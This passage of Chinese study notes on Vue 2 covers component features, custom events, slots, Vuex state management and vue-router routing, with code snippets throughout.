简写形式

```react
import Vue from "vue";
import App from "./App.vue";
Vue.config.productionTip = false;
new Vue({
  el: "#app",
  render: createElement => createElement(App),
});
```

#### 修改默认配置

Vue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，请执行下面的命令,也可以查看到Vue脚手架的默认配置

```powershell
vue inspect > output.js
```

如果要对vue默认配置进行修改，那么可以在根目录下创建一个vue.config.js文件

![image-20210828093327995](https://i.loli.net/2021/08/28/fmQwo2vyDRdPZj6.png)

使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh，关闭语法检测

```json
module.exports = {
  pages: {
    index: {
      //入口文件
      entry: "src/main.js",
    },
  },
  lintOnSave: false, //关闭自动语法检查
};

```

### ref属性

#### 定义

被用来给元素或子组件注册引用信息（id的替代者）

应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）

我们可以通过vc上的$refs属性查看到所有绑定ref属性的元素

this.$refs  ==  页面中所有带有ref属性的DOM的集合

在标签中 使用 ref属性 则在this.$refs中拿到的是DOM对象

在组件中 使用 ref属性 则在this.$refs中拿到的是实例对象(vuecomponent)

```vue
<template>
  <div class="App">
    <h1 ref="title">{{ msg }}</h1>
    <School ref="school"></School>
    <button ref="btn" @click="show">获取元素</button>
  </div>
</template>

<script>
import School from "./components/School";
export default {
  name: "App",
  components: { School },
  data() {
    return {
      msg: "欢迎来到后盾网!",
    };
  },
  methods: {
    show() {
      console.log(this.$refs.title); //.真实DOM元素
      console.log(this.$refs.btn); //真实DOM元素
      console.log(this.$refs.school); //组件实例对象vc
    },
  },
};
</script>
```

#### 特点

ref属性的 value 不能重复 否则会被覆盖

```javascript
var App = {
				template: `
                <div>
                    <A ref = "abc"/>
                    <button ref = "btn">晨颜</button>
                    <button ref = "btn">晨颜1</button>
                </div>
            `,
				// 组件实例化之后
				created() {
					console.log(this.$refs);
				},
    			// 挂载之后
				mounted() {
					console.log(this.$refs.abc.$data.message); //打印晨颜1 前边的被覆盖了
				},
			};
```



### props属性

让组件接受外部传过来的数据

#### 传递数据

在App中的模板上添加属性，注意如果是特殊的属性比如是年龄，那么可以加上v-bind这样的话就是一个表达式，而不是一个字符串

```vue
<template>
  <div class="App">
    <h1>{{ msg }}</h1>
    <Student name="李四" sex="男" age="18"></Student> //age接受的是字符串
    <Student name="李四" sex="男" :age="18"></Student> //age接受的是数字，因为是表达式
    <hr />
  </div>
</template>
```

#### 接收数据

1. 简单接收（只接受）

```vue
<script>
  export default {
    name: "Student",
    data() {
      return {};
    },
    //简单数据接受
    props: ["name", "sex", "age"],
  };
</script>
```

2. 限制类型（限制接收过来的数据类型）,限制之后，如果接收过来的数据不是限定的类型那么控制台就会报错

```vue
<script>
export default {
  name: "Student",
  data() {
    return {};
  },
  // 限制类型接收
  props: {
    name: String,
    sex: String,
    age: Number,
  },
};
</script>
```

3. 限制类型、限制必要性、指定默认值 type - required - default

```vue
<script>
export default {
  name: "Student",
  data() {
    return {};
  },
  props: {
    name: {
      type: String,
      required: true,
    },
    age: {
      type: Number,
      default: 100,
    },
    sex: {
      type: String,
      default: "男",
    },
  },
};
</script>
```

#### 注意点

props是只读的，Vue底层会检测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据,props中的数据权重是高于data中的数据的

```vue
<template>
  <div class="Student">
    <h2>学生姓名：{{ name }}</h2>
    <h2>学生性别：{{ sex }}</h2>
    <h2>学生年龄：{{ myAge }}</h2>
    <button @click="change">年龄点击加1</button>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      myAge: this.age,
    };
  },
  methods: {
    change() {
      this.myAge++;
    },
  },
  //限制类型、配置默认值、限制必要性接收
  props: {
    name: {
      type: String,
      required: true,
    },
    age: {
      type: Number,
      default: 100,
    },
    sex: {
      type: String,
      default: "男",
    },
  },
};
</script>
```

### mixin(混入)

可以把多个组件共用的配置提取成一个混入对象

#### 定义混合

创建一个js文件然后将要共用的配置设置为一个对象，然后导出

```javascript
const mixin1 = {
  methods: {
    show() {
      alert(this.name);
    },
  },
  mounted() {
    console.log("钩子函数");
  },
};
const mixin2 = {
  data() {
    return {
      x: 100,
      y: 200,
    };
  },
};
export { mixin1, mixin2 };
```

#### 使用局部混入

```vue
<template>
  <div class="Student">
    <h2 @click="show">学校名称：{{ name }}</h2>
    <h2>学校网址：{{ site }}</h2>
  </div>
</template>

<script>
//引入mixin文件
import { mixin1, mixin2 } from "../mixin";
export default {
  name: "Student",
  data() {
    return {
      name: "后盾网",
      site: "http://houdunren.com",
    };
  },
  mounted() {
    console.log("钩子函数!!!!!");
  },
  //配置要使用的混入对象
  mixins: [mixin1, mixin2],
};
</script>
```

#### 使用全局混入

如果使用全局混入那么所有的vc以及vm身上都会存在mixin的配置项

```javascript
import Vue from "vue";
import App from "./App";
//引入mixin
import { mixin1, mixin2 } from "./mixin";
Vue.config.productionTip = false;
// 使用全局mixin
Vue.mixin(mixin1);
Vue.mixin(mixin2);
new Vue({
  el: "#app",
  render: h => h(App),
});

```

#### 注意点

1. 如果本身就有数据或者方法，然后混入中也有相同的数据或者方法，那么会使用本身自己的，如果没有才使用混入的
2. 生命周期钩子如果mixin中有，自身也有，那么将都会执行使用

### 插件

用于增强Vue，包含install方法的一个对象，install的第一个参数是构造函数Vue，第二个以后的参数是插件使用者传递的数据。

#### 定义插件

创建一个js文件夹，一般名称是plugins

```javascript
export default {
  install(Vue,x,y) {
    Vue.config.productionTip = false;
    //使用者传递过来的参数
    console.log(x, y);
    //全局过滤器
    Vue.filter("mySlice", function(value) {
      return value.slice(0, 3);
    });

    //定义全局指令
    Vue.directive("fbind", {
      //指令与元素成功绑定时（一上来）
      bind(element, binding) {
        element.value = binding.value;
      },
      //指令所在元素被插入页面时
      inserted(element, binding) {
        element.focus();
      },
      //指令所在的模板被重新解析时
      update(element, binding) {
        element.value = binding.value;
      },
    });

    // 定义混入
    Vue.mixin({
      methods: {
        show() {
          alert(this.name);
        },
      },
    });

    //在Vue的原型对象上定义一个demo方法
    Vue.prototype.demo = () => alert("demo:" + "后盾人");
  },
};
```

#### 使用插件

使用的时候我们只需要在main中调用use函数即可

```javascript
import Vue from "vue";
import App from "./App";
import plugins from "./plugins";
//使用插件
Vue.use(plugins,params1,params2,......);
new Vue({
  el: "#app",
  render: h => h(App),
});
```

### scoped

给style标签加上这个属性之后可以让样式只在局部生效，可以防止命名冲突

```vue
<style scoped>
.demo {
  background: pink;
}
</style>
```

#### lang

lang属性可以指定style的css是使用css还是less编译

### 总结todoList案例

#### 组件化编码流程

1. 拆分静态组件：组件要求按照功能点拆分，命名不要与html元素冲突
2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件再用：
   - 一个组件在用：放在组件自身即可
   - 一些组件在用：放在他们共同的父组件上（状态提升）
3. 实现交互：从绑定事件开始

#### props适用场景

1. 父组件==>子组件  通信
2. 子组件==>父组件 通信 （要求父先给子一个函数）

#### 注意点

1. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的
2. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做

### 自定义事件

自定义事件是一种组件间通信的方式，适用于：子组件==>父组件

#### 适用场景

A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）

#### 绑定自定义事件	

第一种方式，在父组件中

```react
<Student @getStudentName="getStudentName" />
export default {
  components: { School, Student },
  data() {
    return {
      msg: "欢迎学习Vue!",
    };
  },
  methods: {
    getStudentName(name) {
      console.log("app中学生的名称是:" + name);
    },
  },
};
```

第二种方式，在父组件中

```react
<Student ref="Student" />
......
mounted() {
  this.$refs.Student.$on("getStudentName", name => {
    console.log("app中学生的名称是:" + name);
  });
}
```

若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法

#### 触发自定义事件

使用`this.$emit('eventName', params)`

```react
......
<button @click="sendStudentName">点击提示学生姓名</button>
......
sendStudentName() {
  //触发Student组件实例对象身上的getStudentName事件，把data中的name数据传递过去
  this.$emit("getStudentName", this.name);
},
```

#### 解绑自定义事件

使用`this.$off('eventName')`

```react
......
 <button @click="unbind">点我解除自定义事件</button>
......
unbind() {
  //解除一个自定义事件
  this.$off("getStudentName");
  //解除多个自定义事件
  this.$off(["getStudentName", "demo"]);
  //清楚所有的自定义事件
  this.$off();
},
```

#### 绑定原生DOM

组件上也可以绑定原生DOM事件，需要使用`native`修饰符

```react
<Student @click.native="show" />
......
methods:{
  show(){
    console.log('show方法')
  }
}
```

#### 注意点

在Vue中on绑定事件的时候，回调如果是普通函数并且没有其他的作用域影响的话this就是指向的触发对象的组件

通过this.refs.xxx.$on(' eventName ', 回调函数) 绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题

### 全局事件总线

是一种组件间通信的方式，适用于任意组件间通信。

#### 安装全局事件总线

```react
new Vue({
  ......
  beforeCreate() {
    Vue.prototype.x = this; //安装全局事件总线，$bus就是当前应用的vm
  },
  ......
});
```

#### 使用事件总线

接收数据

A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身

```react
methods:{
  demo(name){......}
}
......
mounted(){
  this.$bus.$on('xxxx',this.demo)
}
```

提供数据

```react
this.$bus.$emit('xxxx',data)
```

最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。

### 消息订阅与发布（pubsub）

一种组件间通信的方式，适用于任意组件间通信

#### 安装pubusb

注意要写成-而不是.

```powershell
npm i pubsub-js
```

#### 使用pubsub

引入pubsub

```
import pubsub from 'pubsub-js'
```

接收数据

A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

```react
methods(){
  demo(data){......}
}
......
mounted(){
  this.pid = pubsub.subscribe('xxx',this.demo)//订阅消息
}
```

提供数据

```react
pubsub.publish('xxx',data)
```

最后在beforeDestroy钩子中，用`pubsub.unsubscribe(pid)`去取消订阅

> ### 第三方库

nanoid可以随机生成id

pubsub消息订阅与发布

animate.css动画库

### nextTick

**$nextTick可以使Vue在下一次的DOM更新之后执行回调**

this.$nextTick 将回调延迟到下次DOM更新循环之后执行。在修改数据之后立即使用它，然后等待DOM更新。

this.$nextTick 跟全局方法 vue.nextTick 一样，不同的是，回调的 this 自动绑定到调用它的实例上。

总的来说，假设我们更改了某个 dom 元素内部的文本，而这时候我们想直接打印这个更改之后的文本是需要 dom 更新之后才会实现的，就像我们把将要打印输出的代码放在 setTimeout(fn, 0) 中
```react
this.$nextTick(function() {
  this.$refs.editInput.focus();
});
```

**this.$nextTick这个方法作用是，当数据被修改后使用这个方法，会回调获取更新后的dom再渲染出来**

![image-20220331154452446](C:\Users\27598\AppData\Roaming\Typora\typora-user-images\image-20220331154452446.png)

### 动画与过渡

在插入、更新或移除DOM元素时 在合适的时候给元素添加样式类名。

#### 图示

![image-20210902160715615](https://i.loli.net/2021/09/02/woinrRVs9S6jPvJ.png)

#### 使用方式

元素进入的样式

1. v-enter：进入的起点
2. v-enter-active：进入过程中
3. v-enter-to：进入的终点

元素离开的样式

1. v-leave：离开的起点
2. v-leave-active：离开过程中
3. v-leave-to：离开的终点

使用`transition`包裹要过渡的元素，并配置name属性

```react
<transition name="hello">
  <h2 v-show="isShow">你好</h2>
</transition>
```

使用动画

```react
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition name="houdunren" appear>
      <h2 v-show="isShow">houdunren.com</h2>
    </transition>
  </div>
</template>
<script>
export default {
  name: "hello",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>
<style scoped>
h2 {
  background: yellowgreen;
  padding: 10px;
}
.houdunren-enter-active {
  animation: houdunren 0.5s linear;
}
.houdunren-leave-active {
  animation: houdunren 0.5s linear reverse;
}
@keyframes houdunren {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0%);
  }
}
</style>
```

使用过渡

```react
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group name="houdunren" appear>
      <h2 v-show="!isShow" key="1">houdunren.com</h2>
      <h2 v-show="isShow" key="2">houdunren.com</h2>
    </transition-group>
  </div>
</template>
<script>
export default {
  name: "hello",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>
<style scoped>
h2 {
  background: yellowgreen;
  padding: 10px;
}
/* 进入的起点 离开的终点 */
.houdunren-enter,
.houdunren-leave-to {
  transform: translateX(-100%);
}
.houdunren-enter-active,
.houdunren-leave-active {
  transition: all 0.5s linear;
}
/* 进入的终点 离开的起点 */
.houdunren-enter-to,
.houdunren-leave {
  transform: translateX(0%);
}
</style>
```

#### 注意点

- 若是有多个元素需要过渡，则需要使用：`<transition-group>`,且每个元素都要指定`key`值
- appear可以让元素刚上来就执行一次开始
- 写样式的时候如果没有给transition添加name属性，那么样式前缀是v-如果是添加了name属性，前缀就是name名字

### Vue脚手架配置代理

#### 方法一

在vue.config.js中添加如下配置：

```javascript
module.exports = {
  devServer: {
    proxy: "http://localhost",
  }
};
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理
3. 工作方式：若按照上述配置代理，当请求了前端（public文件）不存在的资源时，那么该请求才会转发个服务器（优先匹配前端资源）

#### 方法二

编写vue.config.js配置具体代理规则：

```javascript
module.exports = {
  devServer: {
    proxy: {
      "/api1": {// 匹配所有以 './api1'开头的请求路径
        target: "http://localhost",
        ws: true, //用于支持websocket
        changeOrigin: true, //用户控制请求头里面的host值
        pathRewrite: { "^/hdcms": "" }, //用于到后端之后校验掉前缀
      },
      "/api2": {// 匹配所有以 './api12开头的请求路径
        target: "http://localhost",
        ws: true,
        changeOrigin: true,
        pathRewrite: { "^/hd": "" },
      },
    },
  },
};
/* 用于伪装请求的端口号
  cahngeOrigin设置为true时，服务器收到的请求头中的host为：localhost
  cahngeOrigin设置为false时，服务器收到的请求头中的host为：localhost：8080
  changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理
2. 缺点：配置略微繁琐，请求资源时必须加前缀

### vue-resource

vue本身也给我们提供了异步请求的插件，安装vue-resource

```powershell
npm i vue-resource
```

使用插件

```react
//引入vue-resource
import vueResource from "vue-resource";
//使用vue-resource异步插件
Vue.use(vueResource);
```

发送请求

```react
this.$http.get\post()
```

### 插槽

让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 父组件 => 子组件

#### 默认插槽

父组件

```vue
<Category title="游戏">
  <div>html结构</div>
</Category>
```

子组件
slot标签中是可以写默认值的，如果不往插槽中传递html结构就会显示默认的内容

```vue
<template>
  <div class="item">
    <h2>{{ title }}</h2>
    <slot>
      基础结构
    </slot>
  </div>
</template>
```

#### 具名插槽

父组件

添加html结构的时候可以为标签加上slot属性，值是需要往哪个插槽中添加数据就写那个插槽的name值

```vue
<Category>
    
  <template slot="center">
    <div>html结构1</div> 
  </template>
    
</Category>

<Category>
    
  <template v-slot:footer>
    <div>html结构2</div>
  </template>
    
</Category>
```

子组件

具名插槽需要在子组件的slot标签上添加name属性

```vue
<template>
  <div>
    <slot name="center">默认内容1</slot>
    <slot name="footer">默认内容2</slot>
  </div>
</template>
```

#### 作用域插槽

数据在子组件的自身，但根据数据生成的结构需要子组件的使用者来决定。（games数据在Category组件中，但使用数据所遍历出来的结构是由App组件决定）

父组件

数据不在父组件身上，我们需要接收到从子组件的slot标签上传递过来的数据，所以需要用到scope属性接收，值是一个对象，当然我们可以使用解构赋值

```vue
......
<Category>
  <template scope="{ games }">
    <ul>
      <li v-for="(item, index) in games" :key="index">{{ item }}</li>
    </ul>
  </template>
</Category>

<Category>
  <template scope="{games}">
    <ol>
      <li v-for="(item, index) in games" :key="index">{{ item }}</li>
    </ol>
  </template>
</Category>
......
```

子组件

我们的数据是相同的但是需要不同的结构所以需要用到插槽，但是数据在我们本身，那么就需要把数据传递给组件的使用者

```react
......
<template>
  <div>
    <slot :games="games">默认数据</slot>
  </div>
</template>

export default {
  name: "Category",
  data() {
    return {
      games: ["英雄联盟", "地下城与勇士", "泡泡堂", "勇士斗恶龙"],
    };
  },
};
......
```

#### 新版的作用域插槽

我们可以推荐使用`v-slot`的方式来进行指定具名插槽，有的时候我们会需要子组件中的数据在父组件中，这个时候我们就可以用到`v-slot:defualt = "slotProps"`，当然我们也可以使用解构赋值结构出来传递的数据

```react
<template>
    <div id="app">
        <Demo msg="你好啊" school="后盾网">
            <template v-slot:hd>
                <span>后盾人</span>
            </template>
            <template v-slot:hw>
                <span>houdunren.com</span>
            </template>
            <template v-slot:users="{ userList }">
                <ul>
                    <li v-for="(user, i) in userList" :key="i">{{ user.name }}</li>
                </ul>
            </template>
        </Demo>
    </div>
</template>
```



## VUEX

专门在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

### npm

```powershell
npm install vuex
```

引入vuex应用插件

```
import Vuex from 'vuex'
```

### 使用场景

1. 多个组件依赖于同一状态
2. 来自不同组件的行为需要变更同一状态

### 多组件共享数据（全局事件总线实现）

![image-20210912140345248](https://i.loli.net/2021/09/12/hlXPqTpagb1xOmD.png)

### 多组件共享数据-vuex实现

![image-20210912140907022](https://i.loli.net/2021/09/12/WcpyV8m4jNSeABz.png)

###  vuex工作原理图

actions、mutations、state都是对象的形式，他们统一被store所管理

![image-20210912143758977](https://i.loli.net/2021/09/12/ZiYLFCAaEl24Kwh.png)

1. dispatch:派遣
2. actions:行动——用于响应组件中的动作
3. backend:后端
4. commit:指派
5. mutations:变化——用于操纵数据（state）
6. devtools:开发者工具
7. state:状态
8. store:仓库-管理者

### 环境搭建

使用vuex之前我们需要搭建具体的环境

创建store文件夹里创建index.js文件，然后写入以下代码

```javascript
//引入vuex插件
import Vuex from "vuex";
//引入vue
import Vue from "vue";
//使用vuex插件
Vue.use(Vuex);
//创建actions来响应组件中的操作
const actions = {};
//创建mutations来改变数据(state)
const mutations = {};
//创建state存放数据
const state = {};
//创建store来控制上面三个对象
export default new Vuex.Store({
  actions,
  mutations,
  state,
});
```

之后我们直接在`main.js`中导入我们创建好的文件之后，在vm的配置项中添加store属性

```javascript
......
import store from "./store";
......
new Vue({
  el: "#app",
  store,//添加store属性
  render: h => h(App),
  beforeCreate() {
    //全局事件总线
    Vue.prototype.$bus = this;
  },
});
```

### 基本使用

在需要修改数据的组件中使用以下代码，如果不需要异步操作等，dispatch之后直接commit的话可以跳过dispatch过程

```javascript
methods:{
  increment() {
    this.$store.dispatch("jia", this.n);
    this.$store.commit("JIA", this.n);
  },
}
```

在store文件中配置,actions中第一个参数是`context`上下文，里面是简约的`store`对象

```javascript
//引入vuex插件
import Vuex from "vuex";
//引入vue
import Vue from "vue";
//使用vuex插件
Vue.use(Vuex);
//创建actions来响应组件中的操作
const actions = {
  jiaodd(context, value) {
    if (context.state.sum % 2) {
      // context.commit("JIA", value);
      context.dispatch("demo1", value);
    }
  },
  demo1(context, value) {
    console.log("demo1被调用了");
    context.dispatch("demo2", value);
  },
  demo2(context, value) {
    console.log("demo2被调用了");
    context.commit("JIA", value);
  },
  jiaWait(context, value) {
    setTimeout(() => {
      console.log("actions调用了");
      context.commit("JIA", value);
    }, 500);
  },
};
//创建mutations来改变数据(state)
const mutations = {
  JIA(state, value) {
    console.log("mutation被调用了");
    state.sum += value;
  },
  JIAN(state, value) {
    console.log("mutation被调用了");
    state.sum -= value;
  },
};
//创建state存放数据
const state = {
  sum: 0, //求和的值
};
//创建store来控制上面三个对象
export default new Vuex.Store({
  actions,
  mutations,
  state,
});
```

组件中读取vuex中的数据：`$store.state.sum`

组件中修改vuex中的数据：`$store.dispatch('actions中的方法'，数据)`

> 备注：若没有网络请求或其他业务逻辑，组件中也可以跳过actions，即不写`dispatch`，直接编写`commit`

### getters

当state中的数据需要经过加工后再使用时，可以使用getters加工，类似于computed

在`store.js`文件中追加`getters`配置

```javascript
.......

const getters = {
  bigSum(state){
    return state.sum * 10;
  }
}

//创建并暴露store
export default new Vuex.Store({
  ......
  getters
})
```

### mapState

用于帮助我们映射出`state`中的数据为计算属性,通过我们引入的`mapState`函数会返回一个生成计算属性的对象，可以配合展开语法

```react
import {mapState} from 'vuex';
......
computed:{
  //借助mapState生成计算属性：sum、school、subject（对象写法）
  ...mapState({sum:'sum',school:'school',subject:'subject'}),
  
  //借助mapState生成计算属性，sum、school、subject（数组写法）
  ...mapState(['sum','school','subject']),
,}
```

### mapGetters

用于帮助我们映射出`getters`中的数据为计算属性

```react
import {mapGetters} from 'vuex';
......
computed:{
  //借助mapGeters生成计算属性：bigSum（对象写法）
  ...mapGetters({bigSum:'bigSum'}),
  
  //借助mapState生成计算属性，bigSum（数组写法）
  ...mapGetters(['bigSum']),
,}
```

### mapMutations

用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数

```react
import {mapMutations} from 'vuex';
......
methods:{
  //借助mapMutations生成方法：increment、decrement（对象写法）
  ...mapMutations({ increment: "JIA", decrement: "JIAN" }),
  
  //借助mapMutations生成方法：increment、decrement（数组写法）
  ...mapMutations(["JIA", "JIAN"]),
,}
```

### mapActions

用于帮助我们生成与`actions`对话的方法，即包含`$store.dispatch(xxx)`的函数

```react
import {mapActions} from 'vuex';
......
methods:{
  //借助mapActions生成方法：incrementOdd、incrementWait（对象写法）
  ...mapActions({ incrementOld: "jiaodd", incrementWait: "jiaWait" }),
  
  //借助mapActions生成方法：incrementOdd、incrementWait（数组写法）
  ...mapActions(['jiaodd','jiaWait']),
,}
```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

### 模块化+命名空间

可以让代码更好维护，让多种数据分类更加明确,修改store.js

```javascript
const countOptions = {
  namespaced:true,//开启命名空间
  state:{x:1},
  mutations:{ ... },
  acitons:{ ... },
  getters:{
    bigSum(state){
      return state.sum * 10;
    }
  }
}
             
const personOptions = {
  namespaced:true,//开启命名空间
  state:{ ... },
  mutations:{ ... },
  acitons:{ ... },
}
             
const store = new Vuex.Store({
  modules:{
    countAbout:"countOptions",
	personAbout:"personOptions"
  }
})
```

1. 读取state数据

第一个参数是拆分的模块配置名称

```react
//方法一：自己直接读取
this.$store.state.personAbout.list
//方法二：借助mapState读取
...mapState('countAbout',['sum','school','subject'])
```

2. 读取getters数据

```react
//方法一：自己直接读取
this.$store.getters['countAbout/firstPersonName']
//方法二：借助mapGetters读取
...mapGetters('countAbout',['firstPersonName'])
```

3. 组件中调用dispatch

```react
//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions
...mapActions('personAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
```

4. 组件中调用commit

```react
//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations
...mapMutations('personAbout',{add:'Add_PERSON'})
```

### 注意点

1. 模块命名空间有两种情况
   1. 不开启命名空间
      - state会区分模块，但是`getter`、`mutations`、`actions`都会出现在全局
      - 在使用的时候state前面需要加模块名，其他的不能加，因为是定义在全局的
   2. 开启命名空间
      - 所有的功能全部会区分模块，更高封装度和复用

2. 在Vue3中使用模块开发state需要写成一个函数

## ROUTER

### 相关理解

#### vue-router

![image-20210918154610207](https://i.loli.net/2021/09/18/LA9pPgcKaSOTIYN.png)

vue的一个插件库，专门用来实现SPA应用

#### SPA

![image-20210918154518424](https://i.loli.net/2021/09/18/Xicp1SDaJAVNMId.png)

1. 单页Web应用（single page web application，SPA）。
2. 整个应用只有一个完整的页面
3. 点击页面中的导航链接不会刷新页面，只会做页面的局部更新。
4. 数据需要通过ajax请求获取。

#### 路由

![image-20210918154445956](https://i.loli.net/2021/09/18/r1cjqIpJOlkuT2d.png)

1. 一个路由就是一组映射关系（key -> value)
2. key为路径，vlaue可能是funciton或component

#### 后端路由

1. 理解：value是function，用于处理客户端提交的请求。
2. 工作过程：服务器接收到一个请求时，根据**请求路径**找到匹配的**函数**来处理请求，返回响应数据

#### 前端路由

1. 理解：value是component，用于展示页面内容。
2. 工作过程：当浏览器的路径改变时，对应的组件就会显示。

### 基本使用

1. 安装vue-router插件，命令：`npm i vue-router`

2. 应用插件：`Vue.use(VueRouter)`

3. 编写router配置项：

   创建router文件夹里面有`index.js`的配置项文件

   ```javascript
   //该文件专用于创建整个应用的路由器
   import VueRouter from "vue-router";
   //引入需要路由的组件
   import About from "../components/About";
   import Home from "../components/Home";
   
   // 创建并暴露router实例对象, 去管理一组一组的路由规则
   export default new VueRouter({
     routes: [
       {
         path: "/About",
         component: About,
       },
       {
         path: "/Home",
         component: Home,
       },
     ],
   });
   ```

4. 在vm中添加router配置项

   ```javascript
   new Vue({
     el: "#app",
     router: router,
     render: h => h(App),
   });
   ```

5. 实现路由切换(active-class可配置高亮样式)

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

6. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

> `router-link`标签中的`to`属性的值就是组件的名称，格式：`/组件名`

#### 注意点

1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹
2. 通过切换，”隐藏“了的路由组件，默认是被销毁的，需要的时候再去挂载
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息
4. 整个应用只有一个`router`，可以通过组件的`$router`属性获取到

### 多级路由

1. 配置路由规则，使用`children`配置项：

   多级路由中的`path`属性不要加/因为底层会在遍历的时候自动加上

```javascript
export default new VueRouter({
  routes: [
    {
      path: "/About",
      component: About,
    },
    
    {
      path: "/Home",
      component: Home,
      children: [ //通过children配置子级路由
        {
          path: "Message", //此处一定不要写 /Message，不要加斜杠
          component: Message,
        },
        {
          path: "News", //此处一定不要写 /Message
          component: News,
        },
      ],
    },
  ],
});
```

2. 跳转

```react
<router-link class="list-group-item" active-class="active" to="/home/News">News</router-link>
```

> 注意：多级路由在写跳转路径的时候要写成完整路径才可以

### query参数

GET请求中的传参方式，在网址后面加上?之后传递参数键值对

```http
http://localhost/user.php?name=后盾人&id=1
```

**路由中的query参数**

需要先在router中配置好路由

```javascript
//该文件专用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入需要路由的组件
import About from "../pages/About";
import Home from "../pages/Home";
//引入二级组件
import Message from "../pages/Message";
import News from "../pages/News";
//引入三级组件
import Detail from "../pages/Detail";
// 创建并暴露router实例对象, 去管理一组一组的路由规则
export default new VueRouter({
   routes: [
      {
         path: "/About",
         component: About,
      },
      {
         path: "/Home",
         component: Home,
         children: [
            {
               path: "Message",
               component: Message,
               children: [
                  {
                     path: "Detail",
                     component: Detail,
                  },
               ],
            },
            {
               path: "News",
               component: News,
            },	
         ],
      },
   ],
});
```

使用`router-link`标签传递参数

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="/home/Message/Detail?id=001&title=你好啊">跳转</router-link>

<!-- 跳转并携带query参数，to的对象写法 -->
<router-link
   :to="{
      path: '/home/Message/Detail',
      query: {
         id: message.id,
         title: message.title,
      },
   }"
>跳转</router-link>
```

接收参数,每个组件的vc都有属于自己的`route`配置，该配置对象中有`query`属性就是我们通过`router-link`传递的参数

```vue
$route.query.id
$route.query.title
```

### 命名路由

可以给路由配置name属性，可以简化路由的跳转

```javascript
{
  path:"/demo",
  component:Demo,
  children:[
    {
      path:'test',
      component:Test,
      chilren:[
        {
          name:"hello",//给路由命名
          path:'welcome',
          component:Hello,
        }
      ]
    }
  ]
}
```

简化跳转

```vue
<!--简化前，需要写完整的路径-->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转-->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数-->
<router-link
  :to="
    {
      name:"hello",
      query:{
        id:666,
        title:'你好'
      }
    }"
>跳转</router-link>
```

### params参数

GET请求中的传参方式，在网址后面加/然后直接写参数

```http
http://localhost/user.php/1/向军
```

**路由中的params参数**

如果是params方式传参，那么path路径后需要使用`:key`站位

```javascript
//该文件专用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入需要路由的组件
import About from "../pages/About";
import Home from "../pages/Home";
//引入二级组件
import Message from "../pages/Message";
import News from "../pages/News";
//引入三级组件
import Detail from "../pages/Detail";
// 创建并暴露router实例对象, 去管理一组一组的路由规则
export default new VueRouter({
   routes: [
      {
         name: "guanyu",
         path: "/about",
         component: About,
      },
      {
         path: "/home",
         component: Home,
         children: [
            {
               path: "message",
               component: Message,
               children: [
                  {
                     name: "xiangqing",
                     path: "detail/:id/:title", //如果使用params传递参数的时候需要在路径中使用:key 占位符
                     component: Detail,
                  },
               ],
            },
            {
               path: "news",
               component: News,
            },
         ],
      },
   ],
});
```

使用router-link标签传递参数

```vue
<!-- 跳转路由并携带params参数，to的字符串写法 -->
<router-link :to="`/home/Message/Detail/666/你好啊`">跳转</router-link>
<!-- 跳转路由并携带params参数，to的对象写法 -->
<router-link
  :to="{
     name: 'xiangqing',
     params: {
        id: 666,
        title: 你好啊,
     },
  }"
  >{{ message.title }}</router-link>
```

> 特别注意：路由携带`params`参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置

接收参数

```vue
$route.params.id
$route.params.title
```

### props配置

让路由组件更方便的收到参数

```javascript
{
  name:"xiangqing",
  path:"detail/:id",
  component:Detail,
  
  //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
  props:{a:900}
  
  //第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数都通过props传给Detail组件
  props:true
  
  //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
  porps($route){
    return {
      id:route.query.id,
      title:route.query.title
    }
  }
}
```

> 一个route中只可以写一个props配置，第三种写法可以使用多重结构语法

